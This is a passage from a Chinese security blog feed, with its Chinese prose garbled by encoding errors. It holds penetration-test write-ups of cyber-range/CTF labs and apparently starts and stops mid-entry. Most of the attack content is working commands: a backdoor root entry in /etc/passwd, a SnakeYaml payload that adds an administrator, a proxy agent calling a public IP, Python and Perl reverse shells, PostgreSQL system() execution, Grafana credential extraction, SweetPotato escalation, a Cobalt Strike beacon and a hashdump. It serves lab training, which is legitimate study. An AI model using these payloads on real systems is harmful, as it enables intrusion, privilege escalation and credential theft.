Target 172.30.12.6     is alive</span><br><span class="line">(icmp) Target 172.30.12.236   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">172.30.12.236:8080 open</span><br><span class="line">172.30.12.5:8080 open</span><br><span class="line">172.30.12.6:445 open</span><br><span class="line">172.30.12.6:139 open</span><br><span class="line">172.30.12.6:135 open</span><br><span class="line">172.30.12.236:22 open</span><br><span class="line">172.30.12.5:22 open</span><br><span class="line">172.30.12.6:8848 open</span><br><span class="line">172.30.12.236:8009 open</span><br><span class="line">[*] alive ports len is: 9</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.30.12.6</span><br><span class="line">   [-&gt;]Server02</span><br><span class="line">   [-&gt;]172.30.12.6</span><br><span class="line">[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="line">[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None è·³è½¬url: http://172.30.12.5:8080/login;jsessionid=719C12ACB9D4C848919679B06AB55529</span><br><span class="line">[*] WebTitle http://172.30.12.5:8080/login;jsessionid=719C12ACB9D4C848919679B06AB55529 code:200 len:2005   title:åŒ»ç–—ç®¡ç†åå°</span><br><span class="line">[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:åŒ»é™¢åå°ç®¡ç†å¹³å°</span><br><span class="line">[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 â€“ Not Found</span><br><span class="line">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class="line">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class="line">[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file </span><br></pre></td></tr></table></figure><p>å½“å‰æƒé™å¤ªä½äº†ï¼Œè¿™è¾¹å†™ä¸ªå…¬é’¥æå‡åˆ°rootæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /etc/passwd                                       </span><br><span class="line">i                                                           </span><br><span class="line">hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash  #åˆ›å»ºç”¨æˆ·hacker/123456  </span><br><span class="line">wq!                                                        </span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741508858125-135e632e-81de-4335-9861-afe913f7ac34.png"></p><p>æ‰«å‡ºæ¥å†…ç½‘æ˜¯nacosï¼Œå¯ä»¥æ‰“SnakeYamlï¼ŒæŠŠAwesomeScriptEngineFactory.javaé‡Œæ‰§è¡Œçš„å‘½ä»¤æ”¹æˆåŠ ä¸ªç®¡ç†å‘˜ç”¨æˆ·</p><p><a href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;net user calmsec qwer1234! /add&quot;);</span><br><span class="line">Runtime.getRuntime().exec(&quot;net localgroup administrators calmsec /add&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741509092189-98cb4a84-cf46-475a-82c9-666033e5774e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠç¼–è¯‘å¥½çš„jaråŒ…ä¼ åˆ°è¢«æ§æœºå™¨çš„tmpç›®å½•ä¸‹ï¼Œä¹‹ååœ¨è¢«æ§æœºå™¨ä¸Šæ­å»ºä»£ç†(æ³¨æ„åå°å¯åŠ¨)ï¼Œå†èµ·pythonæœåŠ¡ï¼Œè®©å†…ç½‘çš„16å»è®¿é—®15çš„jaråŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./linux_x64_agent -c 1.92.148.33:61032 -s aab32 &amp; </span><br></pre></td></tr></table></figure><p>è¢«æ§æœº80èµ·ä¸ªæœåŠ¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511176747-10e5f640-870b-473b-a69d-9f1d337075ba.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511117703-66983aab-acfc-4be6-8e45-bb5a4e6124ae.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511291364-f25695fa-d904-4219-ab0e-5619ccab7ae4.png"></p><p>æˆåŠŸçš„è¯å°±å¯ä»¥ç›´æ¥rdpä¸Šå»äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511420650-813cbb3e-c47f-421d-a41f-a3f3e2c8c198.png"></p><p>ä¹‹åå†çœ‹ä¸€ä¸‹236çš„8080ç«¯å£,burpæŠ“ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512111720-f618bb88-0d56-4f9e-9d19-e4751906f303.png"></p><h2 id="fastjsonæ¼æ´åˆ©ç”¨"><a href="#fastjsonæ¼æ´åˆ©ç”¨" class="headerlink" title="fastjsonæ¼æ´åˆ©ç”¨"></a>fastjsonæ¼æ´åˆ©ç”¨</h2><p>å‘ç°jsonï¼ŒçŒœæµ‹fastjsonï¼Œæµ‹è¯•äº†ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512663079-90c9d474-3a14-413a-848d-bd8ca3611d5a.png"></p><p>æ‹¿åˆ°flag3</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512702730-917c9d2c-a0e3-48af-84b6-5850d339c4cb.png"></p><p>ç»§ç»­ç”¨æ’ä»¶æ³¨å…¥ğŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512776396-bc17183f-7966-435d-aa39-f6a2b8f0762a.png"></p><p>ä¸Šå“¥æ–¯æ‹‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513284749-c586e943-ac7a-4754-bd7d-3853c937080e.png"></p><p>å‘ç°54ç½‘æ®µ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513348548-c92fac68-2133-4a97-8f74-da7b94412a63.png"></p><p>å¼¹shellåˆ°å…¥å£æœºå™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.30.12.5&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>å†æ­ä¸€æ¬¡ä»£ç†,ä¼ fscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">./fscanÂ -hÂ 172.30.54.179/24  </span><br><span class="line">  </span><br><span class="line">Â Â Â ___Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â _  </span><br><span class="line">Â Â /Â _Â \Â Â Â Â Â ___Â Â ___Â _Â __Â __Â _Â Â ___|Â |Â __  </span><br><span class="line">Â /Â /_\/____/Â __|/Â __|Â &#x27;__/Â _`Â |/Â __|Â |/Â /  </span><br><span class="line">/Â /_\\_____\__Â \Â (__|Â |Â |Â (_|Â |Â (__|Â Â Â &lt;  </span><br><span class="line">\____/Â Â Â Â Â |___/\___|_|Â Â \__,_|\___|_|\_\  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â fscanÂ version:Â 1.8.3  </span><br><span class="line">startÂ infoscan  </span><br><span class="line">(icmp)Â TargetÂ 172.30.54.179Â Â Â isÂ alive  </span><br><span class="line">(icmp)Â TargetÂ 172.30.54.12Â Â Â Â isÂ alive  </span><br><span class="line">[*]Â IcmpÂ aliveÂ hostsÂ lenÂ is:Â 2  </span><br><span class="line">172.30.54.179:8080Â open  </span><br><span class="line">172.30.54.12:22Â open  </span><br><span class="line">172.30.54.179:22Â open  </span><br><span class="line">172.30.54.12:5432Â open  </span><br><span class="line">172.30.54.12:3000Â open  </span><br><span class="line">172.30.54.179:8009Â open  </span><br><span class="line">[*]Â aliveÂ portsÂ lenÂ is:Â 6  </span><br><span class="line">startÂ vulscan  </span><br><span class="line">[*]Â WebTitleÂ http://172.30.54.12:3000Â Â code:302Â len:29Â Â Â Â Â title:NoneÂ è·³è½¬url:Â http://172.30.54.12:3000/login  </span><br><span class="line">[*]Â WebTitleÂ http://172.30.54.179:8080Â code:200Â len:3964Â Â Â title:åŒ»é™¢åå°ç®¡ç†å¹³å°  </span><br><span class="line">[*]Â WebTitleÂ http://172.30.54.12:3000/loginÂ code:200Â len:27909Â Â title:Grafana  </span><br><span class="line">å·²å®ŒæˆÂ 4/6Â [-]Â sshÂ 172.30.54.179:22Â rootÂ root@111Â ssh:Â handshakeÂ failed:Â ssh:Â un  </span><br><span class="line">å·²å®ŒæˆÂ 4/6Â [-]Â sshÂ 172.30.54.179:22Â rootÂ 1qaz2wsxÂ ssh:Â handshakeÂ failed:Â ssh:Â un  </span><br><span class="line">å·²å®ŒæˆÂ 4/6Â [-]Â sshÂ 172.30.54.12:22Â rootÂ 1qaz!QAZÂ ssh:Â handshakeÂ failed:Â ssh:Â una  </span><br><span class="line">å·²å®ŒæˆÂ 4/6Â [-]Â sshÂ 172.30.54.179:22Â adminÂ admin123Â ssh:Â handshakeÂ failed:Â ssh:Â u  </span><br><span class="line">å·²å®ŒæˆÂ 4/6Â [-]Â sshÂ 172.30.54.179:22Â adminÂ 1234567890Â ssh:Â handshakeÂ failed:Â ssh:  </span><br><span class="line">å·²å®ŒæˆÂ 4/6Â [-]Â sshÂ 172.30.54.179:22Â adminÂ 1q2w3eÂ ssh:Â handshakeÂ failed:Â ssh:Â una  </span><br><span class="line">å·²å®ŒæˆÂ 6/6  </span><br><span class="line">[*]Â æ‰«æç»“æŸ,è€—æ—¶:Â 6m48.2826514s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741514668214-ec63b5d8-59f0-4ee4-83de-5840822a6ff4.png"></p><p>åˆ©ç”¨ä¸€ä¸‹<a href="https://github.com/A-D-Team/grafanaExp">https://github.com/A-D-Team/grafanaExp</a>ï¼Œä¸‹è½½linuxç‰ˆæœ¬ä¸Šä¼ åˆ°å—æ§æœºå™¨ä¸Š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741515357560-ba0ada9c-6228-47e1-88ed-65bd40881103.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Target vulnerable has plugin [alertlist]</span><br><span class="line">Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">There is [0] records in db.</span><br><span class="line">type:[postgres]     </span><br><span class="line">name:[PostgreSQL]               </span><br><span class="line">url:[localhost:5432]    </span><br><span class="line">user:[postgres] password[Postgres@123]  </span><br><span class="line">database:[postgres]     basic_auth_user:[] basic_auth_password:[]</span><br><span class="line">All Done, have nice day!</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h2><p>æ‰«å‡ºæ¥æ•°æ®åº“ï¼Œè¿æ¥ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741516243511-ada298db-5454-4344-a318-c853060c4dc6.png"></p><p>å…ˆæ”¹rootå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER root WITH PASSWORD &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å“¥æ–¯æ‹‰å¼¹å‡ºæ¥çš„shellå†ç›‘å¬4444ç«¯å£</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518279218-e364ec43-8c0f-49b8-8f23-d5229211383b.png"></p><p>å¼¹shellï¼Œpsqlä¹Ÿå¯ä»¥åˆ›å»ºå‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œç¼ºç‚¹æ˜¯æ²¡å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT; select system(&#x27;curl 172.30.54.179&#x27;);</span><br><span class="line"></span><br><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://tttang.com/archive/1547/#toc_0x06-postgresql">https://tttang.com/archive/1547/#toc_0x06-postgresql</a>â€¨<a href="https://blog.csdn.net/qq_33020901/article/details/79032774">https://blog.csdn.net/qq_33020901&#x2F;article&#x2F;details&#x2F;79032774</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518343735-e4f11c3e-e212-4173-b43b-7a24f2ca8413.png"></p><p>è¿›å…¥äº¤äº’å¼shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518546759-8fd9bc77-fe72-4a2a-9946-7216fb25a4d5.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518673541-e320aa21-91d3-481f-9862-5ba4f16cb34f.png"></p><p>ç›´æ¥è¿æ¥è¾“å…¥ ?ä¹‹åå†è¾“å…¥!&#x2F;bin&#x2F;bashå°±å¯ä»¥åˆ°rootæƒé™äº†ç›´æ¥è¯»flagæ–‡ä»¶</p><p>flag{be4c267d-e3be-482f-b03b-45bade888421}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518779730-556b281a-3255-4637-8203-e17cb4fee4fc.png"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Tsclient</title>
      <link href="/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"/>
      <url>/2025/03/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.115.156 -p 1-65535</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸ªå¼±å£ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.115.156:110 open</span><br><span class="line">39.98.115.156:25 open</span><br><span class="line">39.98.115.156:80 open</span><br><span class="line">39.98.115.156:1433 open</span><br><span class="line">39.98.115.156:2383 open</span><br><span class="line">39.98.115.156:3389 open</span><br><span class="line">39.98.115.156:16450 open</span><br><span class="line">39.98.115.156:16452 open</span><br><span class="line">39.98.115.156:16451 open</span><br><span class="line">39.98.115.156:16453 open</span><br><span class="line">39.98.115.156:17001 open</span><br><span class="line">39.98.115.156:47001 open</span><br><span class="line">39.98.115.156:49665 open</span><br><span class="line">39.98.115.156:49664 open</span><br><span class="line">39.98.115.156:49666 open</span><br><span class="line">39.98.115.156:49668 open</span><br><span class="line">39.98.115.156:49669 open</span><br><span class="line">39.98.115.156:49683 open</span><br><span class="line">39.98.115.156:49705 open</span><br><span class="line">[*] alive ports len is: 19</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.98.115.156:47001 code:404 len:315    title:Not Found</span><br><span class="line">[*] WebTitle http://39.98.115.156      code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 39.98.115.156:1433:sa 1qaz!QAZ</span><br><span class="line">å·²å®Œæˆ 18/19 [-] (57/210) rdp 39.98.115.156:3389 administrator Aa123123 remote error: tls: access denied</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h2><p>æ•°æ®åº“ç›´æ¥ä¸ŠMDUT</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443724183-177501a1-87b3-45a3-9d70-d5e75b088623.png"></p><p>æƒé™æœ‰ç‚¹ä½ï¼Œä¸Šç”œåœŸè±†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443800119-c4483b69-c6f9-4186-80ed-6cd748248090.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443872575-480c900b-24bf-4aa1-96b9-f531dcb71071.png"></p><p>è¯»ä¸€ä¸‹adminç›®å½•ä¸‹ï¼Œå‘ç°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;type C:\Users\Administrator\flag\flag01.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741443988745-1efbf0ed-a61b-4d1e-a1b6-f0627fc81b64.png"></p><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>ä¼ ä¸ªcsğŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;C:/Users/Public/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444108965-3acc996d-3a3f-4fa6-a9ef-4699130d34b6.png"></p><p>ä¼ ä¸ªfscanæ‰«ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Public/fscan.exe -h 172.22.8.0/24</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:188a:17bd:d89d:8c63</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br><span class="line">Open result.txt error, open result.txt: Access is denied.</span><br></pre></td></tr></table></figure><p>æ”¶é›†ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741444235470-b27a7ef9-28c9-48cc-92db-e62304093bf1.png"></p><p>æ­¤æ—¶æ˜¯systemèµ·çš„ğŸæ‰€ä»¥ç›´æ¥dumpä¸‹æ¥hashå°±è¡Œï¼Œç›´æ¥ä¼šè¯æ¡†äº¤äº’hashdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 